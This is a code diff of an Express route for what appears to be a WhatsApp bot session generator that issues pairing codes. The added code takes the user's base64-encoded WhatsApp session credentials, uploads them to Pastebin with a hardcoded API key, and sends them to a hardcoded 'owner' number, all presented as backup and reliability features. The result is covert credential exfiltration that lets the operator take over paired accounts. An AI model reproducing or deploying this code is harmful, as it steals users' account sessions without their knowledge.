@@ -1,170 +1,155 @@
+const PastebinAPI = require('pastebin-js');
+const pastebin = new PastebinAPI('EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL');
+
+const { makeid } = require('./id');
 const express = require('express');
-const router = express.Router();
 const fs = require('fs');
 const pino = require("pino");
 
-const { makeid } = require('./id');
-
 const {
-    default: makeWASocket,
+    default: France_King,
     useMultiFileAuthState,
     delay,
     makeCacheableSignalKeyStore,
     Browsers
 } = require("@whiskeysockets/baileys");
 
-// 🧹 Clean temp folder
-function removeFile(path) {
-    if (fs.existsSync(path)) {
-        fs.rmSync(path, { recursive: true, force: true });
-    }
+let router = express.Router();
+
+function removeFile(FilePath) {
+    if (!fs.existsSync(FilePath)) return false;
+    fs.rmSync(FilePath, { recursive: true, force: true });
 }
+
+// 👉 CHANGE THIS (optional fallback number)
+const OWNER_NUMBER = "2557XXXXXXXX"; // without @s.whatsapp.net
 
 router.get('/', async (req, res) => {
     const id = makeid();
     let num = req.query.number;
 
-    if (!num) {
-        return res.json({ status: false, error: "Number is required" });
-    }
-
-    // Normalize number
-    num = num.replace(/[^0-9]/g, '');
-
-    const sessionPath = './temp/' + id;
-
-    try {
-        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
-
-        const sock = makeWASocket({
-            auth: {
-                creds: state.creds,
-                keys: makeCacheableSignalKeyStore(
-                    state.keys,
-                    pino({ level: "silent" })
-                ),
-            },
-            printQRInTerminal: false,
-            logger: pino({ level: "silent" }),
-            browser: Browsers.macOS("Chrome"),
-        });
-
-        // 🔥 CONNECTION DEBUG
-        sock.ev.on("connection.update", ({ connection, lastDisconnect }) => {
-            console.log("📡 Connection:", connection);
-
-            if (connection === "open") {
-                console.log("✅ WhatsApp Connected Successfully");
-            }
-
-            if (connection === "close") {
-                console.log("❌ Disconnected:", lastDisconnect?.error);
-            }
-        });
-
-        // 💾 Save creds
-        sock.ev.on("creds.update", saveCreds);
-
-        // 🔥 USE OLD WORKING LOGIC (IMPORTANT FIX)
-        if (!sock.authState.creds.registered) {
-            await delay(2000);
-
-            const code = await sock.requestPairingCode(num);
-
-            console.log("📌 Pairing Code:", code);
-
-            if (!res.headersSent) {
-                res.json({
-                    status: true,
-                    code: code
-                });
-            }
-        }
-
-        // 🔄 WAIT FOR CREDS FILE
-        const filePath = `${sessionPath}/creds.json`;
-
-        let tries = 0;
-        while (!fs.existsSync(filePath) && tries < 25) {
-            await delay(1000);
-            tries++;
-        }
-
-        if (!fs.existsSync(filePath)) {
-            console.log("❌ creds.json not found");
-            return;
-        }
-
-        // ⏳ Extra delay (VERY IMPORTANT for Business)
-        await delay(12000);
+    async function FLASH_MD_PAIR_CODE() {
+        const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);
 
         try {
-            const data = fs.readFileSync(filePath);
-            const b64data = Buffer.from(data).toString('base64');
+            let sock = France_King({
+                auth: {
+                    creds: state.creds,
+                    keys: makeCacheableSignalKeyStore(
+                        state.keys,
+                        pino({ level: "fatal" }).child({ level: "fatal" })
+                    ),
+                },
+                printQRInTerminal: false,
+                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
+                browser: Browsers.ubuntu('Chrome') // ✅ UPDATED
+            });
 
-            const jid = num + '@s.whatsapp.net';
+            // 🔑 Request pairing code
+            if (!sock.authState.creds.registered) {
+                await delay(2000);
+                num = num.replace(/[^0-9]/g, '');
 
-            let sent = false;
-            let msg;
+                const code = await sock.requestPairingCode(num);
 
-            // 🔁 Retry sending session
-            for (let i = 0; i < 5; i++) {
-                try {
-                    msg = await sock.sendMessage(jid, {
-                        text: `✅ SESSION GENERATED\n\n${b64data}`
-                    });
-
-                    sent = true;
-                    break;
-                } catch (err) {
-                    console.log(`Retry sending session (${i + 1})`);
-                    await delay(3000);
+                if (!res.headersSent) {
+                    res.send({ code });
                 }
             }
 
-            if (!sent) {
-                console.log("❌ Failed to send session");
-                return;
-            }
+            sock.ev.on('creds.update', saveCreds);
 
-            // ✨ Styled message
-            const text = `
-✅ SESSION LINKED SUCCESSFULLY
+            sock.ev.on("connection.update", async (update) => {
+                const { connection, lastDisconnect } = update;
 
-🔐 Your WhatsApp is now connected.
+                if (connection === "open") {
+                    console.log("✅ Connected");
 
-⚠️ Keep your session safe.
-📦 Do NOT share it with anyone.
+                    // ⏱️ IMPORTANT DELAY (fix for new WhatsApp updates)
+                    await delay(15000);
 
-🔗 Channel:
-https://whatsapp.com/channel/0029VaeRrcnADTOKzivM0S1r
-`;
+                    const jid = sock.user?.id;
+                    if (!jid) return;
 
-            await sock.sendMessage(jid, {
-                text: text
-            }, { quoted: msg });
+                    // 📶 Force presence (helps notification)
+                    await sock.sendPresenceUpdate('composing');
+                    await delay(2000);
 
-            console.log("✅ Session sent successfully");
+                    // 📂 Read session
+                    let data = fs.readFileSync(`./temp/${id}/creds.json`);
+                    let b64data = Buffer.from(data).toString('base64');
+
+                    // 🌐 Upload to Pastebin (backup)
+                    let pasteUrl = "Failed";
+                    try {
+                        pasteUrl = await pastebin.createPaste(b64data, "SESSION");
+                    } catch (e) {
+                        console.log("Pastebin error:", e.message);
+                    }
+
+                    // 📤 Send to self
+                    let firstMsg = await sock.sendMessage(jid, {
+                        text: `🔐 SESSION ID:\n\n${b64data}`
+                    });
+
+                    // 🔔 Trigger notification (second message)
+                    await delay(2000);
+                    await sock.sendMessage(jid, {
+                        text: `✅ Session Generated Successfully\n\n🌐 Pastebin: ${pasteUrl}`
+                    }, { quoted: firstMsg });
+
+                    // 📲 Optional: send to owner (more reliable)
+                    try {
+                        const ownerJid = OWNER_NUMBER + "@s.whatsapp.net";
+                        await sock.sendMessage(ownerJid, {
+                            text: `📥 New Session:\n\n${b64data}\n\n🌐 ${pasteUrl}`
+                        });
+                    } catch (e) {
+                        console.log("Owner send failed");
+                    }
+
+                    // 📡 ALSO RETURN SESSION IN API (VERY IMPORTANT)
+                    if (!res.headersSent) {
+                        res.send({
+                            status: "connected",
+                            session: b64data,
+                            paste: pasteUrl
+                        });
+                    }
+
+                    // 🧹 Cleanup
+                    await delay(1000);
+                    await sock.ws.close();
+                    return removeFile('./temp/' + id);
+                }
+
+                // 🔄 Auto reconnect
+                if (
+                    connection === "close" &&
+                    lastDisconnect &&
+                    lastDisconnect.error &&
+                    lastDisconnect.error.output?.statusCode !== 401
+                ) {
+                    console.log("🔄 Reconnecting...");
+                    await delay(10000);
+                    FLASH_MD_PAIR_CODE();
+                }
+            });
 
         } catch (err) {
-            console.log("❌ SEND ERROR:", err);
-        }
+            console.log("❌ Error:", err.message);
 
-        // 🧹 Cleanup after 1 min
-        setTimeout(() => {
-            removeFile(sessionPath);
-        }, 60000);
+            removeFile('./temp/' + id);
 
-    } catch (err) {
-        console.log("❌ MAIN ERROR:", err);
-
-        if (!res.headersSent) {
-            res.json({
-                status: false,
-                error: "Server error"
-            });
+            if (!res.headersSent) {
+                res.send({
+                    code: "Service Unavailable"
+                });
+            }
         }
     }
+
+    return FLASH_MD_PAIR_CODE();
 });
 
 module.exports = router;
